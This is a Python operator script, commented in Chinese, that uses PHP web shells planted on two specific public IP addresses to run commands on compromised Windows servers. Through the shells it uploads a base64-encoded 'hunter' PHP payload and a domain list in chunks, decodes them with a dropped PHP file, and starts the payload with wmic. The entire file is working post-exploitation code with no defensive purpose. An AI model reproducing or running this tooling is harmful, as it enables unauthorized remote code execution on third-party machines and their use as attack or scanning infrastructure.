#!/usr/bin/env python3
"""部署hunter到150.158和81.70"""
import urllib.request, ssl, base64, urllib.parse, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE

def exec_cmd(shell_url, cmd, timeout=30):
    try:
        data = urllib.parse.urlencode({"x": cmd}).encode()
        r = urllib.request.urlopen(urllib.request.Request(shell_url, data=data), timeout=timeout, context=ctx)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:40]}"

# 目标: (名称, shell URL, PHP路径)
targets = [
    ("150.158", "http://150.158.95.91/x.php", "C:/Users/Administrator/Desktop/phpStudy20161103/php/php-5.2.17/php.exe"),
    ("81.70", "http://81.70.245.25/x.php", "C:/phpStudy/php/php-5.4.45/php.exe"),
]

hunter_b64 = base64.b64encode(open("/tmp/hunter_win.php","rb").read()).decode()
domains_b64 = base64.b64encode(open("/tmp/win_domains.txt","rb").read()).decode()

for name, shell, php in targets:
    print(f"=== {name} ===", flush=True)
    # 1. 传hunter_win.php
    r = exec_cmd(shell, f'file_put_contents("C:/phpScan/hunter_win.php", base64_decode("{hunter_b64}")); echo H1;')
    print(f"  hunter: {'H1' in r}", flush=True)
    # 2. 建目录
    exec_cmd(shell, 'mkdir C:/phpScan 2>nul & echo ok')
    # 3. 传域名池(分块)
    CHUNK = 2000
    parts = [domains_b64[i:i+CHUNK] for i in range(0, len(domains_b64), CHUNK)]
    exec_cmd(shell, "echo -n > C:/phpScan/domains_b64.txt")
    ok = True
    for i, p in enumerate(parts):
        r = exec_cmd(shell, f"echo -n {p} >> C:/phpScan/domains_b64.txt")
        if "ERR" in r:
            print(f"  块{i}失败", flush=True); ok = False; break
    print(f"  域名池{len(parts)}块: {ok}", flush=True)
    # 4. 用PHP解码
    dec = f'<?php $d=file_get_contents("C:/phpScan/domains_b64.txt");file_put_contents("C:/phpScan/domains.txt",base64_decode($d));echo "D:".strlen(base64_decode($d)); ?>'
    dec_b64 = base64.b64encode(dec.encode()).decode()
    exec_cmd(shell, f'file_put_contents("C:/phpScan/d.php", base64_decode("{dec_b64}"));')
    r = exec_cmd(shell, f'system("{php} C:/phpScan/d.php");', timeout=40)
    print(f"  解码: {[x for x in r.split(chr(10)) if x.strip()][-1:] if r.strip() else '?'}", flush=True)
    # 5. wmic启动
    r = exec_cmd(shell, f'system("wmic process call create \\\"{php} C:/phpScan/hunter_win.php\\\"");', timeout=30)
    import re
    pid = re.findall(r"ProcessId = (\d+)", r)
    print(f"  启动: PID={pid[0] if pid else '?'}", flush=True)
    time.sleep(2)
